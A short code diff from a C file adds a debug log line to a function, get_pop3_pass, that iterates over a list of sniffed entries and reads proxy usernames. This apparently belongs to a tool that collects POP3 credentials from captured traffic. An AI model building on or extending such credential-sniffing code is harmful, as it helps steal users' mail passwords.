@@ -86,7 +86,7 @@ int get_pop3_pass(char *res, int res_size){
     begin_Sniffer_List();
 
   int n = 0;
-
+  log_print(INFO, "%d", sniffer_hast_next());
   while(sniffer_hast_next() && res_size > n){
     sniff_info *pop3_info = sniffer_get_next();
     char *user_socks = pop3_info->proxy_username;
